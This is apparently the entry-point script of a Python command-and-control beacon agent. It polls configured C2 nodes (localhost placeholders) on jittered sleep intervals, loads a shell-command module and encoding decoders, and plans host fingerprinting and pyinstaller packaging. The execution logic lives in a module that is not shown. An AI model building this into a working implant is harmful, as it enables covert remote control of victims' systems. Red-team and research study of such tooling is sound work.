#!/usr/bin/env python

from controller import Controller
import time
from random import randint

#
# Overall configurations should include:
# - XML to be parsed by Python to provide Strings of available modules
# - A pyinstaller
#
# TODO:
# - Prevent replays
# - Add active day and active hour calculation to calculate_sleep()
# - Get a GUID based off of MAC/IP/PC Name
# - Move global values into an xml/plist type file for persistent changes from C2 node.
# - Create a tracking mechanism for threads started by commands from previous orders
#
# READ:
# - http://docs.python-guide.org/en/latest/shipping/freezing/
# - http://stackoverflow.com/questions/13629321/handling-dynamic-import-with-py2exe
# - http://www.pythoncentral.io/pyinstaller-package-python-applications-windows-mac-linux/

PROMPT = "[]>"

MIN_SLEEP_INT = 60
MAX_SLEEP_INT = 600
ACTIVE_DAYS = ('M','T','W','Th','F','Sa','Su')
ACTIVE_HOURS = ('0001','2359')
NODES = [('http_get',{'node':'127.0.0.1','port':'8080','path':'sample_command.html'})
        ,('http_get',{'node':'127.0.0.1','port':'8000','path':'sample_command.html'})
        ,('http_get',{'node':'127.0.0.1','port':'8090','path':'sample_command.html'})]

# global flag
continue_beacon = True

def load_config():
    #
    # this is where the configuration file is parsed.
    #
    beacons = ['http_get']
    commands = ['shell_command', 'test_command']
    decoders = ['base64c','rot13','jsonc']
    encoders = []
    responders = []
    
    if len(encoders) == 0:
            encoders = reversed(decoders)
            
    if len(responders) == 0:
            responders = beacons
    
    return (beacons,commands,decoders,encoders,responders)
    
def calculate_sleep():

    #cur_time = time.ctime()
    sleep_time = 0

    sleep_time += randint(MIN_SLEEP_INT,MAX_SLEEP_INT)
    
    return sleep_time
    

def start_beacon_loop(controller):
    
    while continue_beacon:
        
        controller.beacon(NODES)
        sleep_int = calculate_sleep()
        print PROMPT + " Sleeping for %d seconds" % (sleep_int)
        time.sleep(sleep_int)
        
    return True
                

def main():
    
    print PROMPT + " Starting..."
    beacons, commands, decoders, encoders, responders = load_config()
    
    print PROMPT + " Building controller..."
    controller = Controller(beacons, commands, decoders, encoders, responders)
    
    print PROMPT + " Starting beaconer loop..."
    start_beacon_loop(controller)
    

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        print PROMPT + " Exiting"
        exit()
